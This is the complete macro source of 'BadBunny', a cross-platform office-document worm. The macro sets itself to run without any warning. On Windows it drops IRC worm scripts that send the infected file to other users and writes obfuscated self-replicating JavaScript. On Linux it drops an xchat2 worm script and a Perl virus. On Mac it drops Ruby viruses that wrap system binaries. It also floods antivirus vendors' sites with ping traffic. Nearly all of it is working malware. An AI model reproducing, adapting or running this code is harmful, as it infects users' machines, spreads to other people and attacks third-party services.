Dim Url As String
Dim myFileProp as Object

Sub badbunny()
rem Ooo.BadBunny by Necronomikon&Wargame from [D00mRiderz]
Dim mEventProps(1) as new com.sun.star.beans.PropertyValue
mEventProps(0).Name = "EventType"
mEventProps(0).Value = "StarBasic"
mEventProps(1).Name = "Script"
mEventProps(1).Value = "macro://ThisComponent/Standard.badbunny.startgame"
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 
oDocument = ThisComponent
otext=oDocument.text
ocursor=otext.createtextcursor()
otext.insertString(ocursor, "BadBunny(c)by Necronomikon[DR],Skyout,Wargame[DR]",false)
url=converttourl("http://www.gratisweb.com/badbunny/badbunny.jpg") 
oDocument = StarDesktop.loadComponentFromURL(url, "_blank", 0, myFileProp() )
msgbox "Hey " +Chr(31)+environ("username") +Chr(31)+ " you like my BadBunny?", 32,"///BadBunny\\\"
call ping
end sub

sub startgame
if GetGUIType =1 then 'windows
call win
end if
if GetGUIType =3 then 'MacOS
call mac
end if
if GetGUIType =4 then 'linux
call lin
end if
end sub

sub win
Dim dirz As String
Dim dummy()
Dim iVar As Integer
Dim Args(0) as new com.sun.star.beans.PropertyValue
Args(0).Name = "MacroExecutionMode"
Args(0).Value = _
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 
   datei="c:\badbunny.odg"
   dateiurl=converttourl(datei)
   odoc=thisComponent
   odoc.storeasurl(dateiurl,dummy())
dirz=Environ ("programfiles")

Open "c:\drop.bad" For Output As #1
Print #1, "[script]"
Print #1, "n0=; IRC_Worm/BadBunny (c)by Necronomikon&Wargame from[D00MRiderz]"
Print #1, "n1=/titlebar *#*#*#*#*#*( Not every Bunny is friendly... )*#*#*#*#*#*#*"
Print #1, "n2=on 1:start:{"
Print #1, "n3=  /if $day == Friday { /echo  }"
Print #1, "n4=on 1:Join:#:if $chan = #virus /part $chan"
Print #1, "n5=on 1:connect:.msg Necronomikon -=I am infected with ur stuff!!!=-"
Print #1, "n6=on 1:connect:.msg wargame -=I am infected with ur stuff!!!=-"
Print #1, "n7=on 1:text:#:*hi*:/say $chan kick me"
Print #1, "n8=on 1:text:#:*hello*:/say $chan kick me"    
Print #1, "n9=on 1:part:#:{"
Print #1, "n10=set %M_E $me"
Print #1, "n11=set %NickName $nick"
Print #1, "n12=set %ccd .dcc"
Print #1, "n13=  if %NickName != %M_E {"
Print #1, "n14=    /q %NickName lets do it like a rabbit...;)"
Print #1, "n15=    /msg %NickName Be my bunny!"
Print #1, "n16=%ccd send -c %NickName c:\badbunny.odg"
Print #1, "n17=  }"
Print #1, "n18=}"
Close #1

if ( Dir(dirz &"\mirc") <> "") then
Filecopy "c:\drop.bad" ,  dirz &"\mirc\script.ini"
end if
if ( Dir("c:\mirc") <> "") then
Filecopy "c:\drop.bad" ,  "c:\mirc\script.ini"

end if
if ( Dir(dirz &"\mirc32") <> "") then
Filecopy "c:\drop.bad" ,  dirz &"\mirc32\script.ini"
end if
if ( Dir("c:\mirc32") <> "") then
Filecopy "c:\drop.bad" ,  "c:\mirc32\script.ini"
end if

Open "c:\badbunny.js" For Output As #2
Print #2, "// BadBunny"
Print #2, "var FSO=WScript.CreateObject(unescape(""%53"")+unescape(""%63"")+unescape(""%72"")+unescape(""%69"")+unescape(""%50"")+unescape(""%74"")+unescape(""%69"")+""n""+unescape(""%67"")+"".""+unescape(""%46"")+unescape(""%69"")+""l""+unescape(""%65"")+unescape(""%53"")+unescape(""%79"")+unescape(""%73"")+unescape(""%74"")+unescape(""%65"")+""mO""+unescape(""%62"")+""j""+unescape(""%65"")+unescape(""%63"")+unescape(""%74""))"
Print #2, "var me=FSO.OpenTextFile(WScript.ScriptFullName,1)"
Print #2, "var OurCode=me.Read(1759)"
Print #2, "me.Close()"
Print #2, "nl=String.fromCharCode(13,10); code=''; count=0; fcode=''"
Print #2, "file=FSO.OpenTextFile(WScript.ScriptFullName).ReadAll()"
Print #2, "for (i=0; i < file.length; i++) { check=0; if (file.charAt(i)==String.fromCharCode(123) && Math.round(Math.random()*3)==1) { foundit(); check=1 } if (!check) { code+=file.charAt(i) } }"
Print #2, "FSO.OpenTextFile(WScript.ScriptFullName,2).Write(code+fcode)"
Print #2, "var jsphile=new Enumerator(FSO.GetFolder(""."").Files)"
Print #2, "for(;!jsphile.atEnd();jsphile.moveNext())"
Print #2, "{"
Print #2, "if(FSO.GetExtensionName(jsphile.item()).toUpperCase()==""JS"")"
Print #2, "{"
Print #2, "var filez=FSO.OpenTextFile(jsphile.item().path,1)"
Print #2, "var Marker=filez.Read(11)"
Print #2, "var allinone=Marker+filez.ReadAll()"
Print #2, "filez.Close()"
Print #2, "if(Marker!=""// BadBunny"")"
Print #2, "{"
Print #2, "var filez=FSO.OpenTextFile(jsphile.item().path,2)"
Print #2, "filez.Write(OurCode+allinone)"
Print #2, "filez.Close()"
Print #2, "}"
Print #2, "}"
Print #2, "}"
Print #2, "function foundit()"
Print #2, "{"
Print #2, "fcodea=''; count=0; randon='';"
Print #2, "for (j=i; j < file.length; j++) { if (file.charAt(j)==String.fromCharCode(123)) { count++; } if (file.charAt(j)==String.fromCharCode(125)) { count--; } if (!count) { fcodea=file.substring(i+1,j); j=file.length; } }"
Print #2, "for (j=0; j < Math.round(Math.random()*5)+4; j++) { randon+=String.fromCharCode(Math.round(Math.random()*25)+97) }"
Print #2, "fcode+=nl+nl+'function '+randon+'()'+nl+String.fromCharCode(123)+nl+fcodea+nl+String.fromCharCode(125)"
Print #2, "code+=String.fromCharCode(123)+' '+randon+'() '"
Print #2, "i+=fcodea.length;"
Print #2, "}"
Print #2, "//->"
Close #2
Shell("c:\badbunny.js",0)
oDoc.store()
End Sub

sub lin()
'xchat2worm part by WarGame
dim HomeDir as string
dim xchat2script as string
dim perlvir as string
dim cmd as string
dim WgeT as string
Dim dummy()
Dim iVar As Integer
Dim Args(0) as new com.sun.star.beans.PropertyValue
Args(0).Name = "MacroExecutionMode"
Args(0).Value = _
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 
   datei="/tmp/badbunny.odg"
   dateiurl=converttourl(datei)
   odoc=thisComponent
   odoc.storeasurl(dateiurl,dummy())

' get home dir
HomeDir = Environ("HOME")

'build the path of our xchat2 script
if HomeDir = "" then
' I could not get $HOME !

else
xchat2script = HomeDir & "/.xchat2/badbunny.py"

' drop the python script
Open xchat2script For Output As #1
print #1,"__module_name__ = "+Chr(34)+"IRC_Worm/BadBunny (c)by Necronomikon&Wargame from[D00MRiderz]"+Chr(34)
print #1,"__module_version__ = "+Chr(34)+"0.1"+Chr(34)
print #1,"__module_description__ = "+Chr(34)+"xchat2 IRC_Worm for BadBunny"+Chr(34)
print #1,"import xchat"
print #1,"def onkick_cb(word, word_eol, userdata):"
print #1,"	if xchat.nickcmp(word[3],xchat.get_info("+Chr(34)+"nick"+Chr(34)+")) != 0:"
print #1,"		xchat.command("+Chr(34)+"DCC SEND "+Chr(34)+"+ word[3] +"+Chr(34)+" /tmp/badbunny.odg"+Chr(34)+")"
print #1,"	return xchat.EAT_NONE"
print #1,"xchat.hook_server("+Chr(34)+"KICK"+Chr(34)+", onkick_cb)"
close #1
endif

'drop the perl virus
perlvir = HomeDir & "/BadBunny.pl"
open perlvir for output as #1
print #1,"#BadBunny"
print #1,"open(File,$0);@MyCode = ;close(File);"
print #1,"foreach $FileName (<*>){open(File,$FileName);$chk = 1;while(){"
print #1,"if($_ =~ /#BadBunny/){$chk = 0;}}close(File);if($chk eq 1){"
print #1,"open(File,"+Chr(34)+">$FileName"+Chr(34)+");print File @MyCode;close(File);}}"
close #1
cmd = "perl " & perlvir
shell(cmd,0)

oDoc.store()
end sub

sub mac()
Dim iVar As Integer
iVar = Int((15 * Rnd) -2)
Select Case iVar
Case 1 To 5
call one
Case 6, 7, 8
call two
Case Is > 8 And iVar < 11
call one
Case Else
call two
End Select
end sub

sub one ()
'thx to skyout
Open "badbunny.rb" For Output As #1
print #1,"#!/usr/bin/env ruby"
print #1,"require 'ftools'"
print #1,"def replacecmd(cmdname, dirpath)"
print #1,"File.move(""#{dirpath}/#{cmdname}"", ""#{dirpath}/#{cmdname}_"")"
print #1,"oldcmd   = File.open(""#{dirpath}/#{cmdname}"", File::WRONLY|File::TRUNC|File::CREAT, 0777)"
print #1,"oldcmd.puts ""#!/usr/bin/env ruby\n"""
print #1,"oldcmd.puts ""puts \""\"""
print #1,"oldcmd.puts ""puts \""\\t\\tYour system has been infected with:\"""""
print #1,"oldcmd.puts ""puts \""\\t\\t>>>> Dropper for BadBunny"""""
print #1,"oldcmd.puts ""puts \""\\t\\t>>>> by SkyOut"""
print #1,"oldcmd.puts ""puts \""\"""""
print #1,"oldcmd.puts ""puts \""Take a moment of patience ...\"""""
print #1,"oldcmd.puts ""puts \""Executing in ...\"""""
print #1,"oldcmd.puts ""sleep 1"""
print #1,"oldcmd.puts ""puts \""3\"""
print #1,"oldcmd.puts ""sleep 1"""
print #1,"oldcmd.puts ""puts \""2\"""
print #1,"oldcmd.puts ""sleep 1"""
print #1,"oldcmd.puts ""puts \""1\"""
print #1,"oldcmd.puts ""sleep 1"""
print #1,"oldcmd.puts ""puts \""\"""
print #1,"oldcmd.puts ""for $args in $* do"""
print #1,"oldcmd.puts ""$argslist = \""#\{$argslist\}\"" + \"" \"" + \""#\{$args\}\"""
print #1,"oldcmd.puts ""end"""
print #1,"oldcmd.puts ""exec \""#{dirpath}/#{cmdname}_ #\{$argslist\}\"""
print #1,"oldcmd.puts ""exit 0"""
print #1,"end"
print #1,"$binary_dirs = Array.new"
print #1,"$binary_dirs = [ ""/bin"", ""/usr/bin"", ""/usr/local/bin"", ""/sbin"", ""/usr/sbin"", ""/usr/local/sbin"" ]"
print #1,"for $dir in $binary_dirs do"
print #1,"if File.directory?($dir) then"
print #1,"if File.writable?($dir) then"
print #1,"Dir.open($dir).each do |file|"
print #1,"next if file =~ /^\S+_/ || file == ""."" || file == "".."""
print #1,"replacecmd(file, $dir)"
print #1,"end"
print #1,"end"
print #1,"end"
print #1,"end"
print #1,"exit 0"
close #1
Shell("badbunny.rb",0)
end sub

sub two() 'thx to SPTH for this...
Open "badbunnya.rb" For Output As #2
print #2,"# BADB"
print #2,"mycode="""
print #2,"mych=File.open(__FILE__)"
print #2,"myc=mych.read(1)"
print #2,"while myc!=nil"
print #2,"mycode+=myc"
print #2,"myc=mych.read(1)"
print #2,"end"
print #2,"mycode=mycode[mycode.length-734,734]"
print #2,"cdir = Dir.open(Dir.getwd)"
print #2,"cdir.each do |a|"
print #2,"if File.ftype(a)==""file"" then"
print #2,"if a[a.length-3, a.length]=="".rb"" then"
print #2,"if a!=File.basename(__FILE__) then"
print #2,"fcode="""
print #2,"fle=open(a)"
print #2,"badb=fle.read(1)"
print #2,"while badb!=nil"
print #2,"fcode+=badb"
print #2,"badb=fle.read(1)"
print #2,"end"
print #2,"fle.close"
print #2,"if fcode[fcode.length-732,4]!=""BADB"" then"
print #2,"fcode=fcode+13.chr+10.chr+mycode"
print #2,"fle=open(a,""w"")"
print #2,"fle.print fcode"
print #2,"fle.close"
print #2,"end"
print #2,"end"
print #2,"end"
print #2,"end"
print #2,"end"
print #2,"cdir.close"
close #2
Shell("badbunnya.rb",0)
End Sub

sub ping()
Shell("ping -l 5000 -t www.ikarus.at",0)
Shell("ping -l 5000 -t www.aladdin.com",0)
Shell("ping -l 5000 -t www.norman.no",0)
Shell("ping -l 5000 -t www.norman.com",0)
Shell("ping -l 5000 -t www.kaspersky.com",0)
Shell("ping -l 5000 -t www.kaspersky.ru",0)
Shell("ping -l 5000 -t www.kaspersky.pl",0)
Shell("ping -l 5000 -t www.grisoft.cz",0)
Shell("ping -l 5000 -t www.symantec.com",0)
Shell("ping -l 5000 -t www.proantivirus.com",0)
Shell("ping -l 5000 -t www.f-secure.com",0)
Shell("ping -l 5000 -t www.sophos.com",0)
Shell("ping -l 5000 -t www.arcabit.pl",0)
Shell("ping -l 5000 -t www.arcabit.com",0)
Shell("ping -l 5000 -t www.avira.com",0)
Shell("ping -l 5000 -t www.avira.de",0)
Shell("ping -l 5000 -t www.avira.ro",0)
Shell("ping -l 5000 -t www.avast.com",0)
Shell("ping -l 5000 -t www.virusbuster.hu",0)
Shell("ping -l 5000 -t www.trendmicro.com",0)
Shell("ping -l 5000 -t www.bitdefender.com",0)
Shell("ping -l 5000 -t www.pandasoftware.comm",0)
Shell("ping -l 5000 -t www.drweb.com",0)
Shell("ping -l 5000 -t www.drweb.ru",0)
Shell("ping -l 5000 -t www.viruslist.com",0)
end sub